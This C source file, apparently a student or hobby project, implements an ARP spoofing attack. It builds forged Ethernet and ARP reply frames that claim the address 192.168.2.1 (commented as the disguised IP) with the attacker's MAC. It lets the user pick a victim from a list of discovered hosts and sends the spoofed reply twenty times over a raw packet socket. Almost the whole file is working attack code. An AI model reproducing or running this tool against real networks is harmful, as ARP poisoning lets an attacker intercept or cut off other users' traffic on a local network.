/******************************************************************************
*    > File Name: arp_attack.c
*
*    >Description: 
*
*    >Version: 1.0
*    > Created Time: 2014年05月01日 星期四 15时04分38秒
*    >Revision: none
*    >Compiler: gcc
*
*    > Author: linzhenhua
*    > Mail: linzhenhualzh@163.com 
*    > Company: 
*
******************************************************************************/
#include "arp.h"

/******************************************************************************
 * 功能： 提取mac地址到buf中
 * 参数1： 待提取的mac地址
 * 参数2： 保存mac地址的缓存
 * 返回值： 无
******************************************************************************/
void mac_str(char *mac, char *buf)
{
    sscanf(mac, "%x:%x:%x:%x:%x:%x", buf+0, buf+1, buf+2, buf+3, buf+4, buf+5);
}

/******************************************************************************
 * 功能： 提取IP地址到buf中
 * 参数1： 待提取的ip地址
 * 参数2： 保存IP地址的缓存
 * 返回值： 无
******************************************************************************/
void ip_str(char *ip, char *buf)
{
    sscanf(ip, "%d.%d.%d.%d", buf+0, buf+1, buf+2, buf+3);
}

/******************************************************************************
 * 功能： 封装以太网帧到buf中
 * 参数1： 目的mac地址
 * 参数2： 源mac地址
 * 参数3： 以太网类型
 * 参数4： 保存以太网帧的缓存
 * 返回值： 无
******************************************************************************/
void encapsulate_frame(char *dest_mac, char *source_mac, unsigned int type, char *buf)
{
    mac_str(dest_mac, buf);
    mac_str("00:00:00:00:00:00", buf+6);
    *(short *)(buf+12) = htons(type);
}

/******************************************************************************
 * 功能： 封装arp帧到buf中
 * 参数1： arp操作字段
 * 参数2： 源mac地址
 * 参数3： 源IP地址
 * 参数4： 目的mac地址
 * 参数5： 目的IP地址
 * 参数6： 保存arp帧的缓存
 * 返回值： 无
******************************************************************************/
void encapsulate_arp(unsigned short ar_op, char *source_mac, char *source_ip, 
        char *dest_mac, struct in_addr *dest_ip, char *buf)
{
    struct arphdr parp;
    char addr_buf[20];

    parp.ar_hrd = htons(ARPHRD_ETHER);     //硬件类型
    parp.ar_pro = htons(ETHERTYPE_IP);     //协议类型
    parp.ar_hln = 6;                       //硬件地址长度48位 6个字节
    parp.ar_pln = 4;                       //协议地址长度32位 4个字节
    parp.ar_op = htons(ar_op);             //操作字段(ARP应答)
    memcpy(buf, &parp, sizeof(struct arphdr));

    mac_str(source_mac, addr_buf);
    ip_str(source_ip, addr_buf+6);
    mac_str(dest_mac, addr_buf+10);
    ip_str((char *)dest_ip, addr_buf+16);
    memcpy(buf+sizeof(struct arphdr), addr_buf, 20);
}

/******************************************************************************
 * 功能： 创建套接字
 * 参数： 无
 * 返回值：返回创建的套接字
******************************************************************************/
int open_packet_socket(void)
{
    int sockfd;

    if( (sockfd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP))) < 0 )
    {
        perror("socket");
        exit(-1);
    }

    return sockfd;
}

/******************************************************************************
 * 功能： arp攻击(线程3)
 * 返回值： 无
******************************************************************************/
void *arp_attack(void)
{
    position *target = NULL;

    int num;
    int i;
    int sockfd;                                 //套接字描述符

    struct sockaddr to;                         //通用套接口地址结构

    char *source_ip = "192.168.2.1";            //my linux IP(伪装的IP)
    char *source_mac = "00:0c:29:55:c3:16";     //my linux mac
    
    struct in_addr dest_ip;                     //目的IP(攻击目标)
    u_char dest_mac[18];                        //目的mac

    /*用于存储以太网帧和ARP帧*/
    char *buf = NULL;
    
    buf = (char *)malloc( sizeof(struct ethernet_head) + ARP_LEN );
    if(NULL == buf)
    {
        printf("Memory allocation failure\n");
        exit(-1);
    }

    linklist_show(&l);
    printf("请输入要攻击的号码：\n");
    scanf("%d", &num);
    printf("输入OK\n");
    pthread_cancel(pthread_id2);            //结束线程2，防止线程2捕获ARP攻击的帧

    target = l.head;
    while( NULL != target ) 
    {
        if(num == target->data.flag)
        {
            memcpy(&dest_ip, &target->data.ip, sizeof(struct in_addr));
            memcpy(dest_mac, target->data.mac, 18);
            break;
        }
        else
        {
            target = target->next; 
        }
    }
    if(NULL == target)
    {
        printf("没有找到目标IP地址和mac地址\n");
        exit(-1);
    }

    /*封装以太网帧*/
    encapsulate_frame(dest_mac, source_mac, ETHERTYPE_ARP, buf);
    /*封装ARP帧*/
    encapsulate_arp(ARPOP_REPLY, source_mac, source_ip, dest_mac, &dest_ip, buf+sizeof(struct ethernet_head));
    //ARPOP_REPLY
    //ARPOP_REQUEST
    /*创建套接字*/
    sockfd = open_packet_socket();

    /*封装地址*/
    bzero(&to, sizeof(struct sockaddr));
    to.sa_family = AF_INET;
    strcpy(to.sa_data, "eth0");    //地址是以太网

    for(i = 0; i < 20; ++i) 
    {
        if(-1 == sendto(sockfd, buf, sizeof(struct ethernet_head)+ARP_LEN, 0, &to, sizeof(struct sockaddr)))
        {
            perror("sendto");
            pthread_exit(NULL);
        }
        sleep(1);
    }

    printf("ARP attack over\n");
    free(buf);
    buf = NULL;

    return NULL;
}
